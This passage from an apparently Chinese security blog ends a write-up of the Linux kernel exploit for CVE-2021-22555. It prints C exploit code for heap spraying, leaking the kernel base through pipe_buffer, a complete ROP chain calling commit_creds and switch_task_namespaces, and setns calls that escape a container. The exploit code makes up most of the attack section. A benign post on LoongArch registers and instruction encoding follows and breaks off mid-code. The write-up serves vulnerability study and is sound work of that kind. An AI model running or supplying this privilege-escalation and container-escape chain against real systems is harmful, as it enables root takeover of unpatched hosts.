<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Put kheap_addr at next to leak its content. Assumes zero bytes before</span><br><span class="line">&#x2F;&#x2F; kheap_addr.</span><br><span class="line">printf(&quot;[*] Spraying fake secondary messages...\n&quot;);</span><br><span class="line">memset(secondary_buf, 0, sizeof(secondary_buf));</span><br><span class="line">build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,</span><br><span class="line">              sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);</span><br><span class="line">if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Use the fake secondary message to read from kheap_addr.</span><br><span class="line">printf(&quot;[*] Leaking primary message...\n&quot;);</span><br><span class="line">if (peek_msg(msqid[fake_idx], &amp;msg_fake, sizeof(msg_fake), 1) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Check if the leak is valid.</span><br><span class="line">if (*(int *)&amp;msg_fake.mtext[PAGE_SIZE] !&#x3D; MSG_TAG) &#123;</span><br><span class="line">  printf(&quot;[-] Error could not leak primary message.\n&quot;);</span><br><span class="line">  goto err_rmid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The primary message contains a pointer to the secondary message.</span><br><span class="line">msg &#x3D; (struct msg_msg *)&amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];</span><br><span class="line">kheap_addr &#x3D; msg-&gt;m_list_next;</span><br><span class="line">if (kheap_addr &amp; (SECONDARY_SIZE - 1))</span><br><span class="line">  kheap_addr &#x3D; msg-&gt;m_list_prev;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Calculate the address of the fake secondary message.</span><br><span class="line">kheap_addr -&#x3D; SECONDARY_SIZE;</span><br><span class="line">printf(&quot;[+] kheap_addr: %&quot; PRIx64 &quot;\n&quot;, kheap_addr);</span><br></pre></td></tr></table></figure>

<h3 id="3-3-绕过KASLR-SMEP"><a href="#3-3-绕过KASLR-SMEP" class="headerlink" title="3.3 绕过KASLR/SMEP"></a>3.3 绕过KASLR/SMEP</h3><p>接下来将通过泄露内核.data段的地址来绕过KASLR，并通过利用内核gadget构造ROP链来绕过SMEP。</p>
<h4 id="3-3-1-释放伪次要消息"><a href="#3-3-1-释放伪次要消息" class="headerlink" title="3.3.1 释放伪次要消息"></a>3.3.1 释放伪次要消息</h4><p>前面构造的伪次要消息的内容是通过socket写入的，那么内核肯定有一个跟socket相关的结构体是指向伪次要消息缓冲区的，事实上该结构体为sk_buff。</p>
<p><img src="/2021/12/27/CVE-2021-22555/7.png" alt></p>
<p>由于结构体msg_msg占据了消息缓冲区前面部分，msgrcv不能完全读取缓冲区的内容，而通过socket则相反。因此，需要通过msgrcv将关键缓冲区释放，后面通过socket读取关键缓冲区的内容。</p>
<p>由于之前构造的伪次要消息的next和prev指针不是有效的地址，现阶段不能直接通过msgrcv释放该伪次要消息，因为内核会检查消息队列链表的完整性。</p>
<p>为了能通过msgrcv释放伪次要消息，需要依次执行以下步骤：</p>
<ol>
<li>通过读取socket释放关键缓冲区。</li>
<li>通过写入socket再次申请关键缓冲区，写入内容为重新构造的伪次要消息，其next和prev指针为自身地址，这样就能绕过链表完整性检查。</li>
<li>通过msgrcv释放伪次要消息。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Freeing fake secondary messages...\n&quot;);</span><br><span class="line">free_skbuff(ss, secondary_buf, sizeof(secondary_buf));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Put kheap_addr at m_list_next &amp; m_list_prev so that list_del() is possible.</span><br><span class="line">printf(&quot;[*] Spraying fake secondary messages...\n&quot;);</span><br><span class="line">memset(secondary_buf, 0, sizeof(secondary_buf));</span><br><span class="line">build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);</span><br><span class="line">if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">printf(&quot;[*] Freeing sk_buff data buffer...\n&quot;);</span><br><span class="line">if (read_msg(msqid[fake_idx], &amp;msg_fake, sizeof(msg_fake), MTYPE_FAKE) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br></pre></td></tr></table></figure>

<h4 id="3-3-2-泄露内核地址"><a href="#3-3-2-泄露内核地址" class="headerlink" title="3.3.2 泄露内核地址"></a>3.3.2 泄露内核地址</h4><p>上一步执行完后，还有sk_buff指向关键缓冲区，那么，如果在关键缓冲区填入包含指向内核.data段指针的数据结构，再通过读取socket来获得缓冲区的完整内容，就可以获得内核.data段的地址，进而计算出.text段的地址，让利用内核gadget成为可能。</p>
<p><img src="/2021/12/27/CVE-2021-22555/8.png" alt></p>
<p>结构体pipe_buffer是个很好的目标，其定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;git.kernel.org&#x2F;pub&#x2F;scm&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git&#x2F;tree&#x2F;include&#x2F;linux&#x2F;pipe_fs_i.h</span><br><span class="line">struct pipe_buffer &#123;</span><br><span class="line">	struct page *page;</span><br><span class="line">	unsigned int offset, len;</span><br><span class="line">	const struct pipe_buf_operations *ops;</span><br><span class="line">	unsigned int flags;</span><br><span class="line">	unsigned long private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct pipe_buf_operations &#123;</span><br><span class="line">	...</span><br><span class="line">	&#x2F;*</span><br><span class="line">	 * When the contents of this pipe buffer has been completely</span><br><span class="line">	 * consumed by a reader, -&gt;release() is called.</span><br><span class="line">	 *&#x2F;</span><br><span class="line">	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>pipe_buffer的成员ops指向一个位于内核.data段的数据结构anon_pipe_buf_ops，它将是接下来的泄露目标。</p>
<p>而且，ops指向的数据结构包含很多跟管道操作相关的函数指针，其中一个是release，它所指向的函数将在释放管道时被调用。那么，通过篡改ops指向伪造的pipe_buf_operations结构，在释放管道时就可以劫持控制流。</p>
<p>为泄露内核.data段的地址，将进行以下步骤：</p>
<ol>
<li>通过向多个管道写入数据让内核构造多个pipe_buffer结构体的实例，其中一个实例将占据关键缓冲区。此时内存布局如下：</li>
</ol>
<p><img src="/2021/12/27/CVE-2021-22555/9.png" alt></p>
<ol start="2">
<li>读取socket，获得anon_pipe_buf_ops的地址，也就是获得了内核.data段地址。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Spraying pipe_buffer objects...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">  if (pipe(pipefd[i]) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] pipe&quot;);</span><br><span class="line">    goto err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;&#x2F; Write something to populate pipe_buffer.</span><br><span class="line">  if (write(pipefd[i][1], &quot;pwn&quot;, 3) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] write&quot;);</span><br><span class="line">    goto err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(&quot;[*] Leaking and freeing pipe_buffer object...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">  for (int j &#x3D; 0; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">    if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) &lt; 0) &#123;</span><br><span class="line">      perror(&quot;[-] read&quot;);</span><br><span class="line">      goto err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    if (*(uint64_t *)&amp;secondary_buf[0x10] !&#x3D; MTYPE_FAKE)</span><br><span class="line">      pipe_buffer_ops &#x3D; *(uint64_t *)&amp;secondary_buf[0x10];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kbase_addr &#x3D; pipe_buffer_ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">printf(&quot;[+] anon_pipe_buf_ops: %&quot; PRIx64 &quot;\n&quot;, pipe_buffer_ops);</span><br><span class="line">printf(&quot;[+] kbase_addr: %&quot; PRIx64 &quot;\n&quot;, kbase_addr);</span><br></pre></td></tr></table></figure>

<p>此时关键缓冲区已被释放，内存布局如下：</p>
<p><img src="/2021/12/27/CVE-2021-22555/10.png" alt></p>
<h3 id="3-4-提权和容器逃逸"><a href="#3-4-提权和容器逃逸" class="headerlink" title="3.4 提权和容器逃逸"></a>3.4 提权和容器逃逸</h3><p>先通过写入socket构造伪pipe_buffer，让ops指针指向在关键缓冲区伪造的pipe_buf_operations，其中的release指针指向跟栈迁移相关的内核.text段的gadget。</p>
<p><img src="/2021/12/27/CVE-2021-22555/11.png" alt></p>
<p>同时，在关键缓冲区构造ROP链依序执行以下任务：</p>
<ol>
<li>保存RBP。</li>
<li>执行commit_creds(prepare_kernel_cred(NULL))，这一步是为了获得root权限。</li>
<li>执行switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)，这一步在容器环境中才有用，否则只是冗余步骤，作用是pid为1的进程的名称空间替换为容器初始化时的全局名称空间init_nsproxy，init_nsproxy名称空间可以访问宿主机的文件系统。</li>
<li>恢复RBP并恢复正常执行流程。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Spraying fake pipe_buffer objects...\n&quot;);</span><br><span class="line">memset(secondary_buf, 0, sizeof(secondary_buf));</span><br><span class="line">buf &#x3D; (struct pipe_buffer *)&amp;secondary_buf;</span><br><span class="line">buf-&gt;ops &#x3D; kheap_addr + 0x290;</span><br><span class="line">ops &#x3D; (struct pipe_buf_operations *)&amp;secondary_buf[0x290];</span><br><span class="line">&#x2F;&#x2F; RSI points to &amp;buf.</span><br><span class="line">ops-&gt;release &#x3D; kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;</span><br><span class="line">build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);</span><br><span class="line">if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line">  </span><br><span class="line">void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) &#123;</span><br><span class="line">  uint64_t *rop;</span><br><span class="line"></span><br><span class="line">  *(uint64_t *)&amp;buf[0x39] &#x3D; kbase_addr + POP_RSP_RET;</span><br><span class="line">  *(uint64_t *)&amp;buf[0x00] &#x3D; kbase_addr + ADD_RSP_D0_RET;</span><br><span class="line"></span><br><span class="line">  rop &#x3D; (uint64_t *)&amp;buf[0xD8];</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Save RBP at scratchpad_addr.</span><br><span class="line">  *rop++ &#x3D; kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; scratchpad_addr; &#x2F;&#x2F; R12</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF;      &#x2F;&#x2F; RBP</span><br><span class="line">  *rop++ &#x3D; kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; RBX</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; R12</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; RBP</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; commit_creds(prepare_kernel_cred(NULL))</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RDI_RET;</span><br><span class="line">  *rop++ &#x3D; 0; &#x2F;&#x2F; RDI</span><br><span class="line">  *rop++ &#x3D; kbase_addr + PREPARE_KERNEL_CRED;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RCX_RET;</span><br><span class="line">  *rop++ &#x3D; 4; &#x2F;&#x2F; RCX</span><br><span class="line">  *rop++ &#x3D; kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; RBP</span><br><span class="line">  *rop++ &#x3D; kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + COMMIT_CREDS;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RDI_RET;</span><br><span class="line">  *rop++ &#x3D; 1; &#x2F;&#x2F; RDI</span><br><span class="line">  *rop++ &#x3D; kbase_addr + FIND_TASK_BY_VPID;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RCX_RET;</span><br><span class="line">  *rop++ &#x3D; 4; &#x2F;&#x2F; RCX</span><br><span class="line">  *rop++ &#x3D; kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; 0xDEADBEEF; &#x2F;&#x2F; RBP</span><br><span class="line">  *rop++ &#x3D; kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RSI_RET;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + INIT_NSPROXY; &#x2F;&#x2F; RSI</span><br><span class="line">  *rop++ &#x3D; kbase_addr + SWITCH_TASK_NAMESPACES;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Load RBP from scratchpad_addr and resume execution.</span><br><span class="line">  *rop++ &#x3D; kbase_addr + POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; scratchpad_addr - 0xA; &#x2F;&#x2F; RBP</span><br><span class="line">  *rop++ &#x3D; kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;</span><br><span class="line">  *rop++ &#x3D; kbase_addr + MOV_RSP_RBP_POP_RBP_RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>释放管道，执行release所指向的gadget，将内核栈迁移到关键缓冲区构造的ROP链处，然后执行完整个ROP链，实现提权。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Releasing pipe_buffer objects...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">  if (close(pipefd[i][0]) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] close&quot;);</span><br><span class="line">    goto err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">  if (close(pipefd[i][1]) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] close&quot;);</span><br><span class="line">    goto err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，将当前进程的名称空间替换成1号进程的，而1号进程的名称空间已经替换成容器初始化时的全局名称空间init_nsproxy，由此实现容器逃逸。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setns(open(&quot;&#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt&quot;, O_RDONLY), 0);</span><br><span class="line">setns(open(&quot;&#x2F;proc&#x2F;1&#x2F;ns&#x2F;pid&quot;, O_RDONLY), 0);</span><br><span class="line">setns(open(&quot;&#x2F;proc&#x2F;1&#x2F;ns&#x2F;net&quot;, O_RDONLY), 0);</span><br></pre></td></tr></table></figure>



<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md" target="_blank" rel="noopener">CVE-2021-22555: Turning \x00\x00 into 10000$</a></p>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22555" target="_blank" rel="noopener"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22555" target="_blank" rel="noopener">CVE-2021-22555 - The MITRE Corporation</a></a></p>
<p><a href="https://www.anquanke.com/post/id/247830" target="_blank" rel="noopener">CVE-2021-22555 linux内核提权</a></p>
<p><a href="https://www.anquanke.com/post/id/251515" target="_blank" rel="noopener">隐藏十五年的漏洞：CVE-2021-22555 漏洞分析与复现</a></p>
<p><a href="https://www.anquanke.com/post/id/254027" target="_blank" rel="noopener">CVE-2021-22555 2字节堆溢出写0漏洞提权分析</a></p>
<p><a href="https://man7.org/linux/man-pages/man7/namespaces.7.html" target="_blank" rel="noopener">namespaces(7) — Linux manual page</a></p>
<p><a href="https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation" target="_blank" rel="noopener">The Route to Root: Container Escape Using Kernel Exploitation</a></p>
<p><a href="https://duasynt.com/blog/linux-kernel-heap-spray" target="_blank" rel="noopener">Linux Kernel universal heap spray</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/12/27/CVE-2021-22555/" data-id="cmd5slr2g000i0lo13lu55i25" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2021/09/24/LoongArch" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2021/09/24/LoongArch/" class="article-date">
  <time datetime="2021-09-24T00:00:00.000Z" itemprop="datePublished">2021-09-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2021/09/24/LoongArch/">LoongArch 研究小记（一）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author: xiongxiao (<a href="mailto:395984722@qq.com">395984722@qq.com</a>),  jiayy (<a href="mailto:chengjia4574@gmail.com">chengjia4574@gmail.com</a>)</p>
<h1 id="LoongArch"><a href="#LoongArch" class="headerlink" title="LoongArch"></a>LoongArch</h1><p>目前世界上主要的指令集架构有 MIPS, X86, Power, Alpha, ARM 等，除了 ARM 是英国的其余都是美国的。国内的芯片厂商龙芯，君正，兆芯，海光，申威，飞腾，海思，展讯，华芯通等购买相应授权并开发相应芯片产品，这就是目前芯片市场的情况，可以说脖子被卡得死死的。</p>
<p>2021.04.30，<a href="https://mp.weixin.qq.com/s/5wzy_rS-C3sGuRzbVKhjJQ" target="_blank" rel="noopener">龙芯自主指令系统LoongArch基础架构手册正式发布</a> ，号称从顶层架构，到指令功能和 ABI 标准等，全部自主设计，不需国外授权。2021.07.23， 基于自主指令集 LA 架构的 <a href="https://mp.weixin.qq.com/s/gccqI3_Z99HxnJuVxNj1hw" target="_blank" rel="noopener">新一代处理器龙芯3A5000正式发布</a> ，据称 spec 2006评分达到26分，接近30分的一代锐龙。</p>
<p>我们小组及时跟进研究了 LA 的手册，并在 3A5000 设备上开发了相应的产品。在这过程中发现网上对这一新生事物缺乏资料（除了官方的），遂写了本篇小记。</p>
<h1 id="inline-Hook"><a href="#inline-Hook" class="headerlink" title="inline Hook"></a>inline Hook</h1><p>其中一个任务是实现 LA 上的 inline hook 。指令手册主要参考:</p>
<ul>
<li>第二章 基础整数指令, 解释指令格式和功能</li>
<li>附录B 指令码一览, 指令的二进制编码方式</li>
</ul>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">基础整数指令涉及的寄存器包括通用寄存器(General-purpose Register，简称 GR) 和 程序记数寄存器(Program Counter，简称PC)</span><br><span class="line"></span><br><span class="line">通用寄存器GR有32个，记为r0~r31, 其中 0 号寄存器r0的值恒为 0。</span><br><span class="line"></span><br><span class="line">GR 的位宽记做 GRLEN。LA32 32bit, LA64 64bit。</span><br><span class="line"></span><br><span class="line">在标准的龙芯架构应用程序二进制接口(Application Binary Interfac, 简称ABI) 中，r1 固定作为存放函数调用返回地址的寄存器。</span><br><span class="line"></span><br><span class="line">其中GR包括 r0 ... r31 共32个</span><br><span class="line"></span><br><span class="line">PC 只有1个，记录当前指令的地址。</span><br><span class="line"></span><br><span class="line">PC 寄存器不能被指令直接修改，只能被转移指令、例外陷入和例外返回指令间接修改。</span><br><span class="line"></span><br><span class="line">可以作为一些非转移类指令的源操作数直接读取。</span><br><span class="line">(以上内容全部摘自指令手册)</span><br></pre></td></tr></table></figure>


<p>补充:<br>根据LoongArch ABI，寄存器功能的更细的划分如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">R0 : 永 远 为0</span><br><span class="line">R1 : ra 返 回 地 址</span><br><span class="line">R2 : tp , 线 程 指 针</span><br><span class="line">R3 : sp , 栈 指 针</span><br><span class="line">R4−R11： 参 数a0−a7 , a0&#x2F;a1 返 回</span><br><span class="line">R12−R20 : t0−t8 临 时 寄 存 器</span><br><span class="line">R21 : r e s e r v e</span><br><span class="line">R22 : fp</span><br><span class="line">R23−R31 : s0−s8 c a l l e e</span><br></pre></td></tr></table></figure>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>这里通过BEQ指令说明如何查询手册，快速获得这条指令相关的信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在附录中可以找到指令的编码</span></span><br><span class="line">BEQ rj, rd, offs 	| 0 1 0 1 1 0 offs[15:0] rj rd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在第二章可以找到指令的功能解释以及编码含义</span></span><br><span class="line">BEQ 将通用寄存器 rj 和通用寄存器 rd 的值进行比较，如果两者相等则跳转到目标地址，否则不跳转</span><br><span class="line"></span><br><span class="line">if GR[rj] == GR[rd] :</span><br><span class="line">	PC = PC + SignExtend(offs16, 2'b0&#125;, GRLEN)</span><br></pre></td></tr></table></figure>
<p>伪代码中 SignExtend(offs16, 2’b0}, GRLEN) 的含义是offs16 左移两位，然后符号扩展到GRLEN(LA64下 即64位)</p>
<p>关于符号扩展<a href="https://zh.wikipedia.org/zh-hans/%E7%AC%A6%E5%8F%B7%E6%89%A9%E5%85%85" target="_blank" rel="noopener">Wiki</a>，C实现如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 依赖 &gt;&gt; 符号本身就是符号扩展的特性，可以简单实现为</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">sign_extend</span><span class="params">(<span class="keyword">long</span> off, <span class="keyword">int</span> bits)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ((off &lt;&lt; (<span class="number">64</span> - bits)) &gt;&gt; (<span class="number">64</span> - bits));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不依赖 &lt;&lt; 符号</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">sign_extend</span><span class="params">(<span class="keyword">long</span> off, <span class="keyword">unsigned</span> <span class="keyword">int</span> bits)</span></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> sign_mask = <span class="number">1U</span>L &lt;&lt; (bits - <span class="number">1</span>);    <span class="comment">// bit[bits - 1] 为 1,其他位全部为 0</span></span><br><span class="line">	<span class="keyword">long</span> pos_mask = (<span class="number">1U</span>L &lt;&lt; bits) - <span class="number">1</span>;    <span class="comment">// bit[0:bits] 全部为 1, bit[bits: 63] 全部为0</span></span><br><span class="line">	<span class="keyword">long</span> neg_mask = ~((<span class="number">1U</span>L &lt;&lt; bits) - <span class="number">1</span>);  <span class="comment">// bit[0:bits] 全部为 0, bit[bits: 63] 全部为1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(off &amp; sign_mask)&#123;</span><br><span class="line">		<span class="comment">// 符号位为 1, 保证扩展后的高位全部为 1</span></span><br><span class="line">		<span class="keyword">return</span> off | neg_mask;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// 符号位为 0, 保证扩展后的高位全部为 0</span></span><br><span class="line">		<span class="keyword">return</span> off &amp; pos_mask;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 